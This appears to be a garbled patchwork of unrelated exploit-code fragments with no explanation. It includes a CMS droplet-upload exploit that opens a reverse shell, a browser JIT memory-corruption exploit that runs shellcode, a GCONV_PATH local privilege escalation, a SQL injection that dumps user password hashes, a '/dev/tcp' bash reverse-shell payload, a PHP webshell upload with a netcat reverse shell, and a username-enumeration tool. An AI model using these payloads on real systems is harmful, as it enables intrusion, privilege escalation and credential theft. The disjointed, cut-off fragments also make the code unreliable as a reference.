print_status("Sessionid: #{sessid}") 
print_status("Userid: #{userid}")
    enc_token = Rex::Text.encode_base64('' + user + ':' + sessid + '')
    token = 'Basic ' + enc_token + ''
print_status("Authorization: #{token}")
    find_admin(token, userid, app_path)


  else
    fail_with(Failure::NotVulnerable, 'An error occurred while login. Try again.')
  end
if sessionid_check
  return Exploit::CheckCode::Vulnerable
else
  return Exploit::CheckCode::Safe
end
#login
body= {'url':'','username_fieldname':'username_t18bknev','password_fieldname':'password_t18bknev','username_t18bknev':args.user,'password_t18bknev':args.password}
r = s2.post(args.url+'/admin/login/index.php', data=body, allow_redirects=False)
if(r.status_code==302 and r.headers['location'].find('/start/') != -1):
    print("[*] Login OK")
else:
    print("[*] Login Failed")
    exit(1)

time.sleep(1)

#create droplet
up = {'userfile':('t18bknev.zip', io.BytesIO(base64.b64decode(PAYLOAD)), "multipart/form-data")}
r = s2.post(args.url+'/admin/admintools/tool.php?tool=droplets&upload=1', files=up)
if(r.status_code==200 and r.text.find('1 Droplet(s) imported') != -1):
    print("[*] Droplet OK")
else:
    print("[*] Exploit Failed")
    exit(1)

time.sleep(1)

#get csrf token
r = s2.get(args.url+'/admin/pages/index.php')
soup = BeautifulSoup(r.text, 'html.parser')
formtoken = soup.find('input', {'name':'formtoken'})['value']

#create page
body= {'formtoken':formtoken,'title':'t18bknev','type':'wysiwyg','parent':'0','visibility':'public','save':''}
r = s2.post(args.url+'/admin/pages/add.php', data=body, allow_redirects=False)
soup = BeautifulSoup(r.text, 'html.parser')
try:
    page_id = soup.findAll("script")[9].string.split("location.href='")[-1].split("\");")[0].split("'")[0].split("=")[1]
    print("[*] Page OK ["+page_id+"]")
except:
    print("[*] Exploit Failed")
    exit(1)

time.sleep(1)

#get csrf token
print("[*] Getting token")
r = s2.get(args.url+'/admin/pages/modify.php?page_id='+page_id)
soup = BeautifulSoup(r.text, 'html.parser')
formtoken = soup.find('input', {'name':'formtoken'})['value']
section_id = soup.find('input', {'name':'section_id'})['value']
    
time.sleep(1)

#add droplet to page
body= {'page_id':page_id,'formtoken':formtoken,'section_id':section_id,'content'+section_id:'[[t18bknev]]','modify':'save'}
r = s2.post(args.url+'/modules/wysiwyg/save.php', data=body, allow_redirects=False)
if(r.status_code==200 and r.text.find('Page saved') != -1):
    print("[*] Adding droplet OK")
else:
    print("[*] Exploit Failed")
    exit(1)   

time.sleep(1)

input("Please make sure that your nc listner is ready...\n\nPRESS ENTER WHEN READY")
body= {'rev_ip':args.attacker_host,'rev_port':args.attacker_port}
r = s2.post(args.url+'/pages/t18bknev.php', data=body, allow_redirects=False)
if(r.status_code==200):
    print("[*] Exploit OK - check your listner")
    exit(0)
else:
    print("[*] Exploit Failed")
    exit(1)
                              [+] Download Monitor - SQL-Injection
                              [@] Developed by Ron Jost (Hacker5preme)
if(EnableTimers) {
    if(AlertOutput) {
        alert("TIME ... " + Message + " time elapsed: " + TotalTime.toString(10) + " read count: " + ReadCount.toString(10));
    }
    else {
        console.log("TIME ... " + Message + " time elapsed: " + TotalTime.toString(10) + " read count: " + ReadCount.toString(10));
    }
}
const Uint32Obj = SparseTrapdoorArray.pop();
Uint32Obj[Index] = 0x80; // This will be an OOB index access which will fail its boundscheck prior to being confused with a Uint8Array
for (var i = 0; i < JITIterations; i++) {} // JIT compile this function
              +-> group                +->shape
              |                        |
              +-> slots                +->elements (Empty in this case)
              |                        |
              +-> Shifted pointer
              |   pointing to          +-> size in bytes of the data buffer
              |   data buffer          |
              +-> Pointer
              |   pointing to          +-> flags
              |   first view           |
for(var i = 0; i < 8; i++) {
    var Temp = new Uint8Array(HelperBuf);
    CorruptedClone[0x30 + i] = Temp[i];
}
//                                             x                       y                        z
// MutableArray.NativeObj.SlotsPtr -> [0x????????Target o] | [bject adress????????] | [0x????????????????]

var SavedSlotsPtrDbl = LeakSlotsPtr();
HelperDbl[0] = SavedSlotsPtrDbl;
HelperDword[0] = HelperDword[0] + 4;
SetSlotsPtr(HelperDbl[0]);

// Patch together a double of the target object address from the two 32-bit property values

HelperDbl[0] = MutableArray.x;
var LeakedLow = HelperDword[1];
HelperDbl[0] = MutableArray.y; // Works in release, not in debug (assertion issues)
var LeakedHigh = HelperDword[0] & 0x00007fff; // Filter off tagged pointer bits
SetSlotsPtr(SavedSlotsPtrDbl);
HelperDword[0] = LeakedLow;
HelperDword[1] = LeakedHigh;

return HelperDbl[0];
HelperDbl[0] = WeakLeakObjectAddress(ExplicitDblArray);
HelperDword[0] = HelperDword[0] + 0x38; // Float64Array data view pointer (same as ArrayBuffer)
ExplicitDblArrayDataPtr = HelperDbl[0];

HelperDbl[0] = WeakLeakObjectAddress(ExplicitDwordArray);
HelperDword[0] = HelperDword[0] + 0x38; // Uint32Array data view pointer (same as ArrayBuffer)
ExplicitDwordArrayDataPtr = HelperDbl[0];

HelperDbl[0] = WeakLeakDbl(HelperDbl[0]); // In the event initialization failed, the first read will return the initial marker data in the x y and z slots of the MutableArray

if(HelperDword[0] == 0x41414141) {
    DebugLog("Arbitrary read primitive failed");
    window.location.reload();
    return 0.0;
}
if(JITInfoAddress) {
    var JITCodePtr = WeakLeakDbl(JITInfoAddress); // Leak the address to the compiled JIT assembly code associated with the JIT'd shellcode function from its JitInfo struct (it is a pointer at offset 0 of this struct)
    return JITCodePtr;
}

return 0.0;
for(var i = 0; i < 1000; i++) { // 1000 QWORDs give me the most stable result. The more double float constants are in the JIT'd function, the more handler code seems to precede them.
    HelperDbl[0] = ScanPtr;
    var DblVal = StrongLeakDbl(ScanPtr); // The JIT'd ASM code being scanned is likely to contain 8 byte sequences which will not be interpreted as doubles (and will have tagged pointer bits set). Use explicit/strong primitive for these reads.
    
    if(DblVal == 5.40900888e-315) {
        HelperDbl[0] = ScanPtr;
        HelperDword[0] = HelperDword[0] + 8; // Skip over egg bytes and return precise pointer to the shellcode
        return HelperDbl[0];
    }
    
    HelperDbl[0] = ScanPtr;
    HelperDword[0] = HelperDword[0] + 8;
    ScanPtr = HelperDbl[0];
}

return 0.0;
var JITCodePtr = GetJSFuncJITCodePtr(JITSprayFunc);

if(JITCodePtr) {
    // Setup the strong read primitive for the stage one egg hunter: attempting to interpret assembly byte code as doubles via weak primitive may crash the process (tagged pointer bits could cause the read value to be dereferenced as a pointer)
    
    HelperDbl[0] = JITCodePtr;
    DebugLog("JIT spray code pointer is 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
    InitStrongRWPrimitive();
    ShellcodeAddress = EggHunter(JITCodePtr); // For this we need the strong read primitive since values here can start with 0xffff and thus act as tags

    if(ShellcodeAddress) {
        // Trigger code exec by calling the JIT sprayed function again. Its code pointer has been overwritten to now point to the literal shellcode data within the JIT'd function
        
        HelperDbl[0] = ShellcodeAddress;
        DebugLog("Shellcode pointer is 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
        var JITInfoAddress = GetJSFuncJITInfoPtr(JITSprayFunc);
        WeakWriteDbl(JITInfoAddress, ShellcodeAddress);
        JITSprayFunc(); // Notably the location of the data in the stage two shellcode Uint8Array can be found at offset 0x40 from the start of the array object when the array is small, and when it is large a pointer to it can be found at offset 0x38 from the start of the array object. In this case though, the stage one egg hunter shellcode finds, disables DEP and ADDITIONALLY executes the stage two shellcode itself, so there is no reason to locate/execute it from JS.
    }
    else {
        DebugLog("Failed to resolve shellcode address");
    }
}
                                                        [+] 404 to 301 - SQL-Injection
                                                        [@] Developed by Ron Jost (Hacker5preme)
execve("/bin/sh", NULL, NULL);
system("mkdir GCONV_PATH=.");
system("touch GCONV_PATH=./" DIR " && chmod 777 GCONV_PATH=./" DIR);
system("mkdir " DIR);
system("echo 'module\tINTERNAL\t\t\tryaagard//\t\t\t" EVILSO "\t\t\t2' > " DIR "/gconv-modules");
system("cp " EVILSO ".so " DIR);

execve(BIN, argv, envp);

return 0;
                                                    [+] Modern Events Calendar Lite SQL-Injection
                                                    [@] Developed by Ron Jost (Hacker5preme)
                       [+] RegistrationMagic SQL Injection
                       [@] Developed by Ron Jost (Hacker5preme)                                                         
try:
    r = requests.post(u, verify=False, timeout=10, headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, data={"ipamusername":user, "ipampassword":password})
    headers = r.headers['Set-Cookie']
    headers_string = headers.split(';')
    for s in headers_string:
        if "phpipam" in s and "," in s: # double same cookie Check LoL
            cookie = s.strip(',').lstrip()
            return cookie
except Exception as e:
    print(f"[+] {e}")
headers = {
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Cookie": cookie
}

try:
    r = requests.post(xpl, verify=False, timeout=10, headers=headers, data=data)
    if "admin" in r.text or "rounds" in r.text:
        print("[+] Vulnerable..\n\n")
        print(f"> Users and hash passwords: \n\n{r.text}")
        print("\n\n> DONE <")
except Exception as e:
    print(f"[-] {e}")
def __init__(self, target_ip, target_port, localhost, localport):
    self.target_ip = target_ip
    self.target_port = target_port
    self.localhost = localhost
    self.localport = localport

def exploitation(self):
    payload = """{"spider":"`/bin/bash -c 'bash -i >& /dev/tcp/""" + localhost + """/""" + localport + """ 0>&1'`"}"""

    #Login to the app (getting auth token)
    url = "http://" + target_ip + ":" + target_port
    r = requests.Session()
    print("[*] Resolving URL...")
    r1 = r.get(url)
    time.sleep(3)
    print("[*] Logging in to application...")
    r2 = r.post(url + "/api/user/auth", json={"username":login,"password":password}, allow_redirects=True)
    time.sleep(3)
    if (r2.status_code == 200):
        print('[*] Login successful! Proceeding...')
    else:
        print('[*] Something went wrong!')
        quit()

    #Create a header out of auth token (yep, it's bad as it looks)
    dict = json.loads(r2.text)
    temp_token = 'Token '
    temp_token2 = json.dumps(dict['token']).strip('"')
    auth_token = {}
    auth_token['Authorization'] = temp_token + temp_token2

    #Get the project list
    print("[*] Getting the project list")
    r3 = r.get(url + "/api/project/index", headers=auth_token, allow_redirects=True)
    time.sleep(3)

    if (r3.status_code != 200):
        print("[!] Something went wrong! Maybe the token is corrupted?")
        quit();

    #Parse the project name for a request (yep, it's worse than earlier)
    dict = r3.text # [{'name': 'test'}]
    dict2 = json.dumps(dict)
    dict3 = json.loads(dict2)
    dict3 = json.loads(dict3)
    name = dict3[0]['name']
    print("[*] Found project: " + name)

    #use the id to check the project
    print("[*] Getting the ID of the project to build the URL")
    r4 = r.get(url + "/api/project/" + name + "/build", headers=auth_token, allow_redirects=True)
    time.sleep(3)
    if (r4.status_code != 200):
        print("[*] Something went wrong! I can't reach the found project!")
        quit();

    #format the json to dict
    dict = r4.text
    dict2 = json.dumps(dict)
    dict3 = json.loads(dict2)
    dict3 = json.loads(dict3)
    id = dict3['id']
    print("[*] Found ID of the project: ", id)
    time.sleep(1)

    #netcat listener
    print("[*] Setting up a netcat listener")
    listener = subprocess.Popen(["nc", "-nvlp", self.localport])
    time.sleep(3)

    #exec the payload
    print("[*] Executing reverse shell payload")
    print("[*] Watchout for shell! :)")
    r5 = r.post(url + "/api/project/" + str(id) + "/parse", data=payload, headers=auth_token, allow_redirects=True)
    listener.wait()

    if (r5.status_code == 200):
        print("[*] It worked!")
        listener.wait()
    else:
        print("[!] Something went wrong!")
        listener.terminate()
def __init__(self, target_ip, target_port, localhost, localport):
    self.target_ip = target_ip
    self.target_port = target_port
    self.localhost = localhost
    self.localport = localport

def exploitation(self):
    payload = """<?php system($_GET['cmd']); ?>"""
    payload2 = """rm+/tmp/f%3bmknod+/tmp/f+p%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+""" + localhost + """+""" + localport + """+>/tmp/f"""

    url = 'http://' + target_ip + ':' + target_port + path
    r = requests.Session()

    print('[*] Resolving URL...')
    r1 = r.get(url + 'documents.php')
    time.sleep(3)

    #Upload the payload file
    print('[*] Uploading the webshell payload...')
    files = {
    'fpic': ('cmd.php', payload + '\n', 'application/x-php'),
    'ftndoc': ('', '', 'application/octet-stream'),
    'ftcdoc': ('', '', 'application/octet-stream'),
    'fdmdoc': ('', '', 'application/octet-stream'),
    'ftcdoc': ('', '', 'application/octet-stream'),
    'fdcdoc': ('', '', 'application/octet-stream'),
    'fide': ('', '', 'application/octet-stream'),
    'fsig': ('', '', 'application/octet-stream'),
    }
    data = {'fpicup':'Submit Query'}
    r2 = r.post(url + 'documents.php', files=files, allow_redirects=True, data=data)
    time.sleep(3)

    print('[*] Setting up netcat listener...')
    listener = subprocess.Popen(["nc", "-nvlp", self.localport])
    time.sleep(3)

    print('[*] Spawning reverse shell...')
    print('[*] Watchout!')
    r3 = r.get(url + '/studentpic/cmd.php?cmd=' + payload2)
    time.sleep(3)

    if (r3.status_code == 200):
        print('[*] Got shell!')
        while True:
            listener.wait()
    else:
        print('[-] Something went wrong!')
        listener.terminate()
    # Enumeration
    total = len(wordlist)
    for counter, user in enumerate(wordlist):
        user_payload = dict(payload_dict)
        for key, value in user_payload.items():
            if value == '{USER}':
                user_payload[key] = user

        dataraw = "".join(['%s=%s&' % (key, value) for (key, value) in user_payload.items()])[:-1]
        headers={"Accept": "*/*" , "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"}

        req = requests.request('POST',url,headers=headers,data=dataraw, proxies=proxies)

        x = "".join('{}: {}'.format(k, v) for k, v in req.headers.items())

        if re.search(r"{}".format(failstr), str(x).replace('\n','').replace('\r','')):
            queue.put((proc_id, "FOUND", user))
            found_queue.put((proc_id, "FOUND", user))
            if stop: break
        elif verbose:
            queue.put((proc_id, "TRIED", user))
        queue.put(("PERCENT", proc_id, (counter/total)*100))

except (urlexcept.NewConnectionError, requests.exceptions.ConnectionError):
    print("[ATTENTION] Connection error on process {}! Try lowering the amount of threads with the -c parameter.".format(proc_id))
# Arguments to simple variables
wordlist = args.wordlist
url = args.url
payload = ['ctl00%24Main%24userNameBox:{USER}', 'ctl00%24Main%24passwordBox:a', 'ctl00%24Main%24ctl05:Login', '__EVENTTARGET:', '__EVENTARGUMENT:', '__VIEWSTATE:']
verbose = args.v
thread_count = args.c
failstr = "PasswordInvalid"
stop = args.s
proxy= args.p

print(bcolors.HEADER + """
  __   ___  __     ___
"""+ bcolors.ENDC);
print("URL: "+url)
print("Payload: "+str(payload))
print("Fail string: "+failstr)
print("Wordlist: "+wordlist)
if verbose: print("Verbose mode")
if stop: print("Will stop on first user found")

proxies = {'http': '', 'https': ''}
if proxy:
    proxies = {'http': proxy, 'https': proxy}

print("Initializing processes...")
# Distribute wordlist to processes
wlfile = open(wordlist, "r", encoding="ISO-8859-1")  # or utf-8
tothread = 0
wllist = [[] for i in range(thread_count)]
for user in wlfile:
    wllist[tothread-1].append(user.strip())
    if (tothread < thread_count-1):
        tothread+=1
    else:
        tothread = 0

# Start processes
tries_q = Queue()
found_q = Queue()
processes = []
percentage = []
last_percentage = 0
for i in range(thread_count):
    p = Process(target=process_enum, args=(tries_q, found_q, wllist[i], url, payload, failstr, verbose, i, stop, proxy))
    processes.append(p)
    percentage.append(0)
    p.start()

print(bcolors.OKBLUE + "Processes started successfully! Enumerating." + bcolors.ENDC)
# Main process loop
initial_count = len(processes)
while True:
    # Read the process output queue
    try:
        oldest = tries_q.get(False)
        if oldest[0] == 'PERCENT':
            percentage[oldest[1]] = oldest[2]
        elif oldest[1] == 'FOUND':
            print(bcolors.OKGREEN + "[{}] FOUND: {}".format(oldest[0], oldest[2]) + bcolors.ENDC)
        elif verbose:
            print(bcolors.OKCYAN + "[{}] Tried: {}".format(oldest[0], oldest[2]) + bcolors.ENDC)
    except: pass

    # Calculate completion percentage and print if /10
    total_percentage = math.ceil(mean(percentage))
    if total_percentage % 10 == 0 and total_percentage != last_percentage:
        print("{}% complete".format(total_percentage))
        last_percentage = total_percentage

    # Pop dead processes
    for k, p in enumerate(processes):
        if p.is_alive() == False:
            processes.pop(k)

    # Terminate all processes if -s flag is present
    if len(processes) < initial_count and stop:
        for p in processes:
            p.terminate()

    # Print results and terminate self if finished
    if len(processes) == 0:
        print(bcolors.OKBLUE + "EnumUser finished, and these usernames were found:" + bcolors.ENDC)
        while True:
            try:
                entry = found_q.get(False)
                print(bcolors.OKGREEN + "[{}] FOUND: {}".format(entry[0], entry[2]) + bcolors.ENDC)
            except:
                break
        quit()
                        [+] WP Visitor Statistics SQL Injection
                        [@] Developed by Ron Jost (Hacker5preme)
